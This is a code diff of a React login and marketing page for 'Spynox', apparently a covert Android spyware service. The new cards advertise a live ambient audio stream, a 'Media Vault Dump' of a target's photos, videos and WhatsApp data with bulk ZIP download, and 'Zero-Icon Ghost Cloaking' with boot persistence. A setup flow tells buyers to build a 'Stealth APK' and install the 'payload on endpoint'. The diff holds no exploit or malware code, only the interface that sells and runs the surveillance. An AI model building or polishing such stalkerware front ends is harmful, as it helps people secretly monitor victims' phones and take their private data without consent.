+                                                className="flex-1 bg-gradient-to-t from-purple-600 via-indigo-500 to-cyan-400 rounded-full transition-all duration-200"
+                                                style={{ height: isAudioLive ? `${h}%` : '15%' }}
+                                            />
+                                        ))}
+                                    </div>
+                                </div>
                             </div>
 
-                            <span className="px-3 py-1 rounded-full bg-cyan-500/15 border border-cyan-500/30 text-xs font-mono font-bold text-cyan-400 shrink-0">
-                                ACTIVE
-                            </span>
+                            <button
+                                type="button"
+                                onClick={() => setIsAudioLive(prev => !prev)}
+                                className="w-full py-3 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-xs font-mono font-bold text-purple-300 flex items-center justify-center gap-2 cursor-pointer transition-all"
+                            >
+                                <Volume2 size={14} />
+                                <span>{isAudioLive ? 'Pause Ambient Stream' : 'Resume Ambient Stream'}</span>
+                            </button>
                         </div>
 
-                        {/* Stealth Switch 3 */}
-                        <div className="clay-card p-5 sm:p-6 rounded-3xl border border-white/10 flex items-center justify-between gap-4">
-                            <div className="space-y-1">
-                                <div className="flex items-center gap-2">
-                                    <Lock size={18} className="text-amber-400" />
-                                    <h3 className="text-sm sm:text-base font-black text-white">AES-256 E2E Encryption</h3>
+                        {/* Bento Card 3: Encrypted Media Vault */}
+                        <div className="clay-card p-5 sm:p-7 rounded-[2.5rem] border border-white/10 space-y-5 flex flex-col justify-between">
+                            <div>
+                                <div className="flex items-center gap-3 pb-3 border-b border-white/5">
+                                    <div className="w-10 h-10 rounded-2xl bg-emerald-500/15 border border-emerald-500/30 flex items-center justify-center text-emerald-400 shrink-0">
+                                        <ImageIcon size={20} />
+                                    </div>
+                                    <div>
+                                        <h3 className="text-base font-black text-white">Media Vault Dump</h3>
+                                        <p className="text-xs text-zinc-400 font-mono">4,218 Files Synced</p>
+                                    </div>
                                 </div>
-                                <p className="text-xs text-zinc-400">All payloads are encrypted with hardware keys in transit.</p>
+
+                                <div className="mt-4 grid grid-cols-2 gap-2 text-xs font-mono">
+                                    <div className="p-2.5 rounded-xl bg-[#12141c] border border-white/5">
+                                        <div className="text-zinc-400 text-[10px]">Photos</div>
+                                        <div className="text-white font-black">14.2 GB</div>
+                                    </div>
+                                    <div className="p-2.5 rounded-xl bg-[#12141c] border border-white/5">
+                                        <div className="text-zinc-400 text-[10px]">Videos</div>
+                                        <div className="text-white font-black">38.6 GB</div>
+                                    </div>
+                                    <div className="p-2.5 rounded-xl bg-[#12141c] border border-white/5">
+                                        <div className="text-zinc-400 text-[10px]">WhatsApp</div>
+                                        <div className="text-white font-black">6.4 GB</div>
+                                    </div>
+                                    <div className="p-2.5 rounded-xl bg-[#12141c] border border-white/5">
+                                        <div className="text-zinc-400 text-[10px]">Vault</div>
+                                        <div className="text-emerald-400 font-black">100% EXIF</div>
+                                    </div>
+                                </div>
                             </div>
 
-                            <span className="px-3 py-1 rounded-full bg-amber-500/15 border border-amber-500/30 text-xs font-mono font-bold text-amber-400 shrink-0">
-                                SECURED
-                            </span>
+                            <button
+                                type="button"
+                                onClick={handleZipExtraction}
+                                className="clay-cta-button w-full py-3 rounded-xl font-mono font-black text-xs uppercase tracking-wider flex items-center justify-center gap-2 cursor-pointer shadow-[0_0_20px_rgba(249,115,22,0.3)]"
+                            >
+                                <Download size={14} />
+                                <span>{isZipExtracting ? 'Packaging Archive...' : 'Download Bulk ZIP'}</span>
+                            </button>
                         </div>
 
-                        {/* Stealth Switch 4 */}
-                        <div className="clay-card p-5 sm:p-6 rounded-3xl border border-white/10 flex items-center justify-between gap-4">
-                            <div className="space-y-1">
-                                <div className="flex items-center gap-2">
-                                    <ShieldAlert size={18} className="text-purple-400" />
-                                    <h3 className="text-sm sm:text-base font-black text-white">Zero Root Access</h3>
+                        {/* Bento Card 4 (2-Column): 100% Zero-Icon Ghost Cloaking */}
+                        <div className="lg:col-span-2 clay-card p-5 sm:p-7 rounded-[2.5rem] border border-white/10 space-y-4 flex flex-col justify-between">
+                            <div>
+                                <div className="flex items-center justify-between pb-3 border-b border-white/5">
+                                    <div className="flex items-center gap-3">
+                                        <div className="w-10 h-10 rounded-2xl bg-orange-500/15 border border-orange-500/30 flex items-center justify-center text-orange-400 shrink-0">
+                                            <EyeOff size={20} />
+                                        </div>
+                                        <div>
+                                            <h3 className="text-base sm:text-lg font-black text-white">Zero-Icon Ghost Cloaking</h3>
+                                            <p className="text-xs text-zinc-400">100% Invisibility with Watchdog Persistence</p>
+                                        </div>
+                                    </div>
+
+                                    {/* Live Toggle Switch */}
+                                    <button
+                                        type="button"
+                                        onClick={() => setIsGhostActive(prev => !prev)}
+                                        className="w-14 h-8 rounded-full bg-black/60 border border-white/10 p-1 flex items-center cursor-pointer transition-colors shrink-0"
+                                    >
+                                        <div 
+                                            className={`w-6 h-6 rounded-full transition-transform ${
+                                                isGhostActive ? 'translate-x-6 uiverse-toggle-knob-active' : 'translate-x-0 uiverse-toggle-knob'
+                                            }`}
+                                        />
+                                    </button>
                                 </div>
-                                <p className="text-xs text-zinc-400">Runs smoothly on standard Android 7 through Android 15.</p>
+
+                                <div className="mt-4 grid grid-cols-1 sm:grid-cols-3 gap-2.5 text-xs font-mono">
+                                    <div className="p-3 rounded-2xl bg-[#12141c] border border-white/5 flex items-center gap-2">
+                                        <CheckCircle2 size={14} className="text-emerald-400 shrink-0" />
+                                        <span>No Launcher Icon</span>
+                                    </div>
+                                    <div className="p-3 rounded-2xl bg-[#12141c] border border-white/5 flex items-center gap-2">
+                                        <CheckCircle2 size={14} className="text-cyan-400 shrink-0" />
+                                        <span>Auto-Restart on Boot</span>
+                                    </div>
+                                    <div className="p-3 rounded-2xl bg-[#12141c] border border-white/5 flex items-center gap-2">
+                                        <CheckCircle2 size={14} className="text-purple-400 shrink-0" />
+                                        <span>Battery Killer Proof</span>
+                                    </div>
+                                </div>
                             </div>
 
-                            <span className="px-3 py-1 rounded-full bg-purple-500/15 border border-purple-500/30 text-xs font-mono font-bold text-purple-400 shrink-0">
-                                COMPATIBLE
-                            </span>
+                            <div className="text-[11px] font-mono text-white/40 pt-2 flex items-center justify-between">
+                                <span>Status: {isGhostActive ? 'CLOAKED & INVISIBLE' : 'ICON VISIBLE'}</span>
+                                <span className="text-emerald-400 font-bold">DAEMON RUNNING</span>
+                            </div>
                         </div>
                     </div>
                 </section>
 
-                {/* 5. 3-Step Setup Flow (Clean Minimal Cards) */}
+                {/* 5. 3-Step Deployment Walkthrough */}
                 <section className="py-10 sm:py-16 px-4 sm:px-6 max-w-5xl mx-auto space-y-6">
                     <div className="text-center space-y-2">
                         <h2 className="text-2xl sm:text-3xl font-black text-white tracking-tight">
@@ -539,9 +435,9 @@ export default function LoginPage() {
 
                     <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                         {[
-                            { num: '01', title: 'Generate Stealth APK', desc: 'Build your customized APK binary in 10 seconds.' },
-                            { num: '02', title: 'One-Time Setup', desc: 'Install payload on endpoint and grant permissions.' },
-                            { num: '03', title: 'Take Live Command', desc: 'Sign in to Spynox and view real-time feeds instantly.' },
+                            { num: '01', title: 'Generate Stealth APK', desc: 'Build your customized APK binary in 10 seconds with custom name and icon.' },
+                            { num: '02', title: 'One-Time Setup', desc: 'Install payload on endpoint and grant necessary permissions in 30 seconds.' },
+                            { num: '03', title: 'Take Live Command', desc: 'Sign in to Spynox and view real-time feeds from any browser instantly.' },
                         ].map((s, idx) => (
                             <div key={idx} className="clay-card p-6 rounded-3xl border border-white/10 space-y-2 relative overflow-hidden">
                                 <span className="text-3xl font-black text-orange-500/30 font-mono block">
@@ -555,7 +451,7 @@ export default function LoginPage() {
                 </section>
 
                 {/* 6. High-Impact Bottom Sign-In Banner */}
-                <section className="py-14 sm:py-20 px-4 sm:px-6 border-t border-white/5 bg-[#090b0e] text-center">
+                <section className="py-14 sm:py-20 px-4 sm:px-6 border-t border-white/5 bg-[#08090d] text-center">
                     <div className="max-w-2xl mx-auto space-y-6">
                         <div className="w-14 h-14 rounded-3xl bg-orange-500/20 border border-orange-500/40 text-orange-400 flex items-center justify-center mx-auto shadow-[0_0_30px_rgba(249,115,22,0.35)]">
                             <Sparkles size={26} />
